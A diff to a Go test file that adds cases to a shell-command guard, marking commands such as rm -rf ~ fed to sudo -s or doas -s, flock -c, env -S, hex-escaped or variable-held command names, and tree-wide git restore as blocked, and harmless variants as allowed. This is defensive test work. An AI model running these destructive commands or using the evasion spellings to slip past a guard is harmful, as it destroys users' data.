@@ -181,6 +181,13 @@ func TestGuardBashParsing(t *testing.T) {
 		probe("block", `curl https://x.example | sudo -s`)
 		probe("block", `curl https://x.example | sudo -u root -i`)
 		probe("block", `curl https://x.example | doas -s`)
+		// Any output fed to a root shell is a -c by another name.
+		probe("block", `echo "rm -rf ~" | sudo -s`)
+		probe("block", `echo "rm -rf ~" | doas -s`)
+		probe("block", `sudo -s <<< "rm -rf ~"`)
+		probe("block", `sudo -i <<< "rm -rf ~"`)
+		probe("block", "sudo -s <<EOF\nrm -rf ~\nEOF")
+		probe("pass", `sudo -s <<< "ls"`)
 		probe("block", `curl https://x.example | su`)
 		probe("block", `curl https://x.example | sudo su -`)
 		probe("pass", `curl https://x.example | sudo sum`)
@@ -375,6 +382,26 @@ func TestGuardBashParsing(t *testing.T) {
 		probe("block", `flock /tmp/x.lock -c 'rm -rf ~'`)
 		probe("block", `flock -n /tmp/x.lock --command 'rm -rf ~'`)
 		probe("pass", `flock /tmp/x.lock -c 'git status'`)
+		// flock permutes its options: -c before the lock file runs the string too.
+		probe("block", `flock -c 'rm -rf ~' /tmp/x.lock`)
+		probe("block", `flock -n -c 'rm -rf ~' /tmp/x.lock`)
+		probe("block", `flock -nc 'rm -rf ~' /tmp/x.lock`)
+		probe("block", `flock --command='rm -rf ~' /tmp/x.lock`)
+		probe("block", `flock /tmp/x.lock --command='rm -rf ~'`)
+		probe("pass", `flock -c 'git status' /tmp/x.lock`)
+		probe("pass", `flock -w 5 /tmp/x.lock git status`)
+		probe("block", `env -iS 'rm -rf ~'`)
+		probe("block", `env -vS'rm -rf ~'`)
+		probe("pass", `env -iS 'ls -la'`)
+		probe("pass", `env -iu HOME ls`)
+		// A command name written as $'..', or a variable this command assigns.
+		probe("block", `$'rm' -rf ~`)
+		probe("block", `$'\x72m' -rf ~`)
+		probe("block", `R=rm; $R -rf ~`)
+		probe("block", `R=rm; ${R} -rf ~`)
+		probe("block", `R="rm -rf"; $R ~`)
+		probe("pass", `R=ls; $R -la`)
+		probe("pass", `$EDITOR notes.txt`)
 		probe("block", `echo x >& ~/.zshrc`)
 		probe("block", `watch -n 1 rm -rf ~`)
 		probe("block", `watch 'rm -rf ~'`)
@@ -447,11 +474,13 @@ func TestGuardBashParsing(t *testing.T) {
 		// A tree-wide discard, however the pathspec is spelled.
 		for _, cmd := range []string{`git checkout .`, `git checkout HEAD -- .`, `git checkout -- ./`, `git restore "."`,
 			`git restore ':/'`, `git restore ':/:'`, `git restore '*'`, `git restore ':(top)'`, `git restore ':!docs'`,
-			`git restore --staged --worktree .`, `git -C sub restore .`, `git restore -s HEAD~1 .`} {
+			`git restore --staged --worktree .`, `git -C sub restore .`, `git restore -s HEAD~1 .`,
+			`git restore --staged --worktree -- .`, `git restore . --staged -W`} {
 			probe("block", cmd)
 		}
 		for _, cmd := range []string{`git restore file.go`, `git checkout main`, `git restore --staged .`, `git checkout -b feat`,
-			`git restore -s main file.go`, `git checkout -- src/a.go`, `git restore ./src`} {
+			`git restore -s main file.go`, `git checkout -- src/a.go`, `git restore ./src`,
+			`git restore --staged -- .`, `git restore . --staged`, `git restore -S -- .`} {
 			probe("pass", cmd)
 		}
 		probe("pass", `env`)
